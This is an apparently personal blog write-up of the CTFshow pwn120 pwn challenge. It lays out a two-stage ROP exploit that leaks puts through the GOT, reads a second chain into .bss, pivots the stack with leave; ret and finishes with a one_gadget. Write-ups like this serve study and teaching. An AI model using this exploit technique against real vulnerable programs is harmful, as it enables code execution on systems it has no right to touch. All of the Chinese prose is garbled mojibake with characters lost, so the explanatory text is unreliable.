---
title: CTFshow pwn120 鏍堣縼绉讳笌浜屾 ROP
published: 2026-04-17
updated: 2026-04-17
description: 绗竴娈靛厛 leak puts 骞舵妸绗簩娈甸摼璇昏繘 .bss锛岄殢鍚庣敤 leave; ret 鍋氭爤杩佺Щ锛岀浜屾鍐嶈惤 one_gadget銆
tags: [CTFshow, Pwn, Stack, Stack Pivot, ROP]
category: ctfshow
draft: false
---

# 棰樼洰缁撹

杩欓鍙湁涓€涓?`exp.py`锛屼絾浠庤剼鏈氨鑳芥妸鍒╃敤閾剧湅娓呮锛氭爣鍑嗙殑鈥滄硠闇?+ 鏍堣縼绉?+ 浜屾閾锯€濄€?
## 鍒╃敤鎬濊矾

1. 绗竴娈?payload 瑕嗙洊鏃ф爤甯э紝椤轰究鎶婃柊鐨?`rbp` 鎸囧埌 `.bss`
2. 璋?`puts(puts@got)` 娉勯湶 libc
3. 鍐嶈皟 `read(0, data_addr, ...)` 鎶婄浜屾閾惧啓鍏?`.bss`
4. 鎵ц `leave; ret`锛屾妸鏍堣縼绉诲埌 `.bss`
5. 绗簩娈靛彧闇€瑕佹斁 one_gadget 鍗冲彲

## 鍏抽敭 exp 鐗囨

```python
payload1 = b'a' * 0x510 + p64(data_addr - 8)
payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
payload1 += p64(pop_rdi_ret) + p64(0)
payload1 += p64(pop_rsi_r15_ret) + p64(data_addr) + p64(0)
payload1 += p64(read_addr) + p64(leave_addr)
```

```python
puts_addr = u64(p.recv(6).ljust(8, b"\x00"))
base_addr = puts_addr - libc.sym['puts']
payload2 = p64(one_gadget + base_addr)
p.send(payload2)
```

## 涓嬭浇

- [涓嬭浇鍒╃敤鑴氭湰 `exp.py`](../../attachments/ctfshow/pwn120/exp.py)

## 璇存槑

杩欎唤璧勬枡閲?`pwn120` 鏂囦欢澶瑰彧淇濈暀浜?exp锛屾病鏈夋妸鍘熷浜岃繘鍒朵竴骞跺瓨涓嬶紝鎵€浠ヨ繖绡囦富瑕佹牴鎹剼鏈繕鍘熸墦娉曘€?
## 閫傚悎璁颁綇鐨勭偣

褰撶幇鍦烘爤绌洪棿涓嶅鏀惧畬鏁?ROP 鏃讹紝`read + leave; ret` 鍋氫簩娈垫爤杩佺Щ鏄潪甯稿疄鐢ㄧ殑閫氳В銆?

